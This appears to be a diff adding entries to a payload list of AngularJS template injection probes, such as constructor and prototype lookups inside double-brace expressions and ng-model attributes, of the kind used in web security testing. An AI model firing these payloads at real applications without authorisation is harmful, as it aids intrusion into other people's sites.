@@ -1,2 +1,13 @@
--e # angular Payload 1
+# Angular JS Injection Payloads
 # Version: 1.0.15-20260301-Minggu-1621-WIB
+
+{{constructor}}
+{{constructor.name}}
+{{'a'.constructor.prototype}}
+{{''.constructor.prototype}}
+<x ng-model>
+<x ng:repeat>
+{{x=y.getOwnPropertyNames(x)}}
+{{x.toString()}}
+{{x=[]["constructor"]["getOwnPropertyNames"](x)}}
+{{"".getOwnDescriptorNames}}
